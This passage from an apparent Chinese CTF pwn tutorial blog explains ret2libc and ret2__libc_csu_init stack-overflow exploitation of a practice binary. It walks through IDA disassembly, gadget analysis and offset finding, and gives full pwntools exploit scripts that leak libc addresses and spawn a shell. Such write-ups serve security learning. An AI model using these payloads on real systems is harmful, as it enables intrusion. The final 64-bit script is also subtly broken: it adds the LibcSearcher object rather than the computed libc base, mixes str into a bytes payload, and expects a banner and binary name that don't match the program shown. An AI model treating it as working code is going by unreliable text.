class="hljs-comment">#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象</span><br>puts_plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<span class="hljs-comment">#puts的plt表的地址，我们需要利用puts函数泄露</span><br>main_plt_addr = elf.symbols[<span class="hljs-string">&#x27;_start&#x27;</span>]<span class="hljs-comment">#返回地址被覆盖为main函数的地址。使程序还可被溢出</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_got_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_plt_addr))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;main_plt_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(main_plt_addr))<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span><br>payload += p32(puts_plt_addr)<span class="hljs-comment">#覆盖返回地址为puts函数</span><br>payload += p32(main_plt_addr)<span class="hljs-comment">#这里是puts函数返回的地址。</span><br>payload += p32(puts_got_addr)<span class="hljs-comment">#这里是puts函数的参数</span><br><br>p.recv()<span class="hljs-comment">#接收程序一开始输出的一些信息</span><br>p.sendline(payload)<br><br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">#将地址输出出来后再用u32解包，此时就得到了puts函数的真实地址。</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;puts_addr = &quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br><br>sys_offset = <span class="hljs-number">0x00048170</span><br>puts_offset = <span class="hljs-number">0x000732a0</span><br>sh_offset = <span class="hljs-number">0x1bd0d5</span><br><br>libc_base_addr = puts_addr - puts_offset<br>sys_addr = libc_base_addr + sys_offset<br>sh_addr = libc_base_addr + sh_offset<br><br>payload2 = <span class="hljs-string">b&#x27;&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">112</span> + p32(sys_addr) + <span class="hljs-string">b&#x27;AAAA&#x27;</span> + p32(sh_addr) <br><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>运行后成功getshell</p><h2 id="ret2libc-64位，ret2-libc-csu-init"><a href="#ret2libc-64位，ret2-libc-csu-init" class="headerlink" title="ret2libc 64位，ret2__libc_csu_init"></a>ret2libc 64位，ret2__libc_csu_init</h2><p>学习参考：<a href="https://www.yuque.com/cyberangel/rg9gdm/ka1885">https://www.yuque.com/cyberangel/rg9gdm/ka1885</a></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p><p>下面直接用实例学习</p><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)，将程序扔到IDA中，其汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000004005C0<br>.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================<br>.text:00000000004005C0<br>.text:00000000004005C0<br>.text:00000000004005C0 ; void _libc_csu_init(void)<br>.text:00000000004005C0                 public __libc_csu_init<br>.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o<br>.text:00000000004005C0 ; __unwind &#123;<br>.text:00000000004005C0                 push    r15<br>.text:00000000004005C2                 push    r14<br>.text:00000000004005C4                 mov     r15d, edi<br>.text:00000000004005C7                 push    r13<br>.text:00000000004005C9                 push    r12<br>.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry<br>.text:00000000004005D2                 push    rbp<br>.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:00000000004005DA                 push    rbx<br>.text:00000000004005DB                 mov     r14, rsi<br>.text:00000000004005DE                 mov     r13, rdx<br>.text:00000000004005E1                 sub     rbp, r12<br>.text:00000000004005E4                 sub     rsp, 8<br>.text:00000000004005E8                 sar     rbp, 3<br>.text:00000000004005EC                 call    _init_proc<br>.text:00000000004005F1                 test    rbp, rbp<br>.text:00000000004005F4                 jz      short loc_400616<br>.text:00000000004005F6                 xor     ebx, ebx<br>.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]<br>.text:0000000000400600<br>.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400600                 mov     rdx, r13<br>.text:0000000000400603                 mov     rsi, r14<br>.text:0000000000400606                 mov     edi, r15d<br>.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]<br>.text:000000000040060D                 add     rbx, 1<br>.text:0000000000400611                 cmp     rbx, rbp<br>.text:0000000000400614                 jnz     short loc_400600<br>.text:0000000000400616<br>.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j<br>.text:0000000000400616                 add     rsp, 8<br>.text:000000000040061A                 pop     rbx<br>.text:000000000040061B                 pop     rbp<br>.text:000000000040061C                 pop     r12<br>.text:000000000040061E                 pop     r13<br>.text:0000000000400620                 pop     r14<br>.text:0000000000400622                 pop     r15<br>.text:0000000000400624                 retn<br>.text:0000000000400624 ; &#125; // starts at 4005C0<br>.text:0000000000400624 __libc_csu_init endp<br>.text:0000000000400624<br>.text:0000000000400624 ; ---------------------------------------------------------------------------<br></code></pre></td></tr></table></figure><p>这里我们可以利用以下几点：从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据（因为都是向寄存器进行pop）。对应的汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040061A                 pop     rbx<br>.text:000000000040061B                 pop     rbp<br>.text:000000000040061C                 pop     r12<br>.text:000000000040061E                 pop     r13<br>.text:0000000000400620                 pop     r14<br>.text:0000000000400622                 pop     r15<br>.text:0000000000400624                 retn<br>.text:0000000000400624 ; &#125; // starts at 4005C0<br>.text:0000000000400624 __libc_csu_init endp<br>.text:0000000000400624<br>.text:0000000000400624 ; ---------------------------------------------------------------------------<br></code></pre></td></tr></table></figure><p>从 0x0000000000400600 到 0x0000000000400609，我们可以将 r13 赋给 rdx,将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，但其实此时 rdi 的高 32 位寄存器值为 0。所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器（rdx、rsi、edi）。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。对应的汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000400600<br>.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j<br>.text:0000000000400600                 mov     rdx, r13<br>.text:0000000000400603                 mov     rsi, r14<br>.text:0000000000400606                 mov     edi, r15d<br>.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]<br></code></pre></td></tr></table></figure><p>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为rbx+1 &#x3D; rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx&#x3D;0，rbp&#x3D;1。对应的汇编代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040060D                 add     rbx, 1<br>.text:0000000000400611                 cmp     rbx, rbp<br>.text:0000000000400614                 jnz     short loc_400600<br></code></pre></td></tr></table></figure><p>开始做题</p><p>首先，查一下保护，开启了NX保护，64位</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><p>运行以下</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">❯ ./level5<br><span class="hljs-built_in">Hello,</span> World<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>看一下源码，<code>main</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, <span class="hljs-number">0xDu</span>LL);<br>  vulnerable_function(<span class="hljs-number">1LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>vulnerable_function</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200u</span>LL);<br>&#125;<br></code></pre></td></tr></table></figure><p>发现<code>read</code>函数，并有溢出</p><p>用<code>cyclic</code>生成字符串，然后用GDB动调，然后用rsp来找偏移，命令是<code>x/wx $rsp</code>不要理解错了，rsp中没有储存返回地址，而是储存存放返回地址的内存的地址，而这个命令是打印<code>rsp</code>指向的内存的内容</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; x/wx $<span class="hljs-built_in">rsp</span><br><span class="hljs-number">0x7fffffffdeb8</span>:<span class="hljs-number">0x6261616a</span><br>❯ cyclic -l <span class="hljs-number">0x6261616a</span><br><span class="hljs-number">136</span><br></code></pre></td></tr></table></figure><p>栈偏移为136</p><p>从IDA里可以看到，没有system函数，但有一个已知的write函数，我们可以利用这个函数并利用libc泄露出程序加载到内存后的地址（当然也可以选用__libc_start_main）。</p><hr><p>补充：</p><p><code>__libc_start_main</code>是Linux程序中glibc库提供的一个非常重要的函数，它在程序的启动过程中扮演着核心角色。这个函数负责完成程序启动前的一系列初始化工作，并最终调用用户的   main   函数。所以，它也在程序依赖的libc库中，注意，它和<code>main</code>函数不同。</p><hr><p>下面时第一部分exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./level&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./level&#x27;</span>)<br><br>pop_addr = <span class="hljs-number">0x40061A</span><br>write_got = e.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>mov_addr = <span class="hljs-number">0x400600</span><br>main_addr = e.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Hello World\n&#x27;</span>)<br>payload0 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">136</span> + p64(pop_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(write_got) + p64(<span class="hljs-number">8</span>) + p64(write_got) + p64(<span class="hljs-number">1</span>) + p64(mov_addr) + <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">6</span>) + p64(main_addr)<br>p.sendline(payload0)<br><br>write_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_addr ==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(write_addr))<br></code></pre></td></tr></table></figure><p>这里重点解释一下<code>payload0</code>：</p><ul><li><p>**b’A’*136：**填充垃圾数据，造成栈溢出</p></li><li><p>然后让pop_addr覆盖栈中的返回地址，使程序执行pop_addr地址处的函数，并分别将栈中的0、1、write_got函数地址、8、write_got、1分别pop到寄存器rbx、rbp、r12、r13、r14、r15中去。之后将pop函数的返回地址覆盖mov_addr的地址为，如下：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>A                 <span class="hljs-keyword">pop</span>     rbx  //rbx-&gt;<span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>B                 <span class="hljs-keyword">pop</span>     rbp  //rbp-&gt;<span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>C                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r12</span>  //<span class="hljs-built_in">r12</span>-&gt;write_got函数地址<br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040061</span>E                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r13</span>  //<span class="hljs-built_in">r13</span>-&gt;<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400620</span>                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r14</span>  //<span class="hljs-built_in">r14</span>-&gt;write_got函数地址<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400622</span>                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">r15</span>  //<span class="hljs-built_in">r15</span>-&gt;<span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400624</span>                 retn         //覆盖为mov_addr<br></code></pre></td></tr></table></figure><p>解释一下payload0中两个write_got函数的作用：再布置完寄存器后，由于有 call qword ptr [r12+rbx*8]它调用了write函数，其参数为write_got函数地址（r14寄存器，动调一下就知道了），写成C语言类似于：write(write_got函数地址)&#x3D;&#x3D;printf（write_got函数地址），再使用u64(p.recv(8))接受数据并print出来就行了</p></li><li><p>之后程序转向mov_addr函数，利用mov指令布置寄存器rdx，rsi，edi</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400600</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">r13</span>  //<span class="hljs-built_in">rdx</span>==<span class="hljs-built_in">r13</span>==<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400603</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">r14</span>  //<span class="hljs-built_in">rsi</span>==<span class="hljs-built_in">r14</span>==write_got函数地址<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400606</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">r15d</span> //<span class="hljs-built_in">edi</span>==<span class="hljs-built_in">r15d</span>==<span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400609</span>                 <span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r12</span>+<span class="hljs-built_in">rbx</span>*<span class="hljs-number">8</span>] //<span class="hljs-keyword">call</span> write_got函数地址 <br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060D</span>                 <span class="hljs-keyword">add</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400611</span>                 <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rbp</span> //<span class="hljs-built_in">rbx</span>==<span class="hljs-number">1</span>,<span class="hljs-built_in">rbp</span>==<span class="hljs-number">1</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400614</span>                 <span class="hljs-keyword">jnz</span>     short loc_400600<br></code></pre></td></tr></table></figure><p>JNZ(或JNE)(jump if not zero, or not equal)，汇编语言中的条件转移指令。结果不为零(或不相等)则转移<br>这里rbx和rbp都等于1，他们相等，所以程序不会执行<code>400603</code>处的命令，但是这些命令的下一条就是<code>pop_addr</code>的命令，但是我们并不希望它执行到这个函数（因为他会再次pop寄存器更换我们布置好的内容），所以就有了<code>b&#39;a&#39;*(0x8+8*6)</code>，它的作用就是为了平衡堆栈，所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域，可以被填充）</p></li></ul><p>之后，我们就可以构建完整的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./level&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./level&#x27;</span>)<br><br>pop_addr = <span class="hljs-number">0x40061A</span><br>write_got = e.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>mov_addr = <span class="hljs-number">0x400600</span><br>main_addr = e.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;Hello World\n&#x27;</span>)<br>payload0 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">136</span> + p64(pop_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(write_got) + p64(<span class="hljs-number">8</span>) + p64(write_got) + p64(<span class="hljs-number">1</span>) + p64(mov_addr) + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x8</span>+<span class="hljs-number">8</span>*<span class="hljs-number">6</span>) + p64(main_addr)<br>p.sendline(payload0)<br><br>write_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_addr ==&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(write_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>, write_addr)<br>libc_base = write_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>sys_addr = libc + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>sh_addr = libc + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system==&gt;&quot;</span>, <span class="hljs-built_in">hex</span>(sys_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sh_addr==&gt;&quot;</span>, <span class="hljs-built_in">hex</span>(sh_addr))<br><br>pop_rdi_ret = <span class="hljs-number">0x400623</span><br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">136</span> + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)<br><br>p.send(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
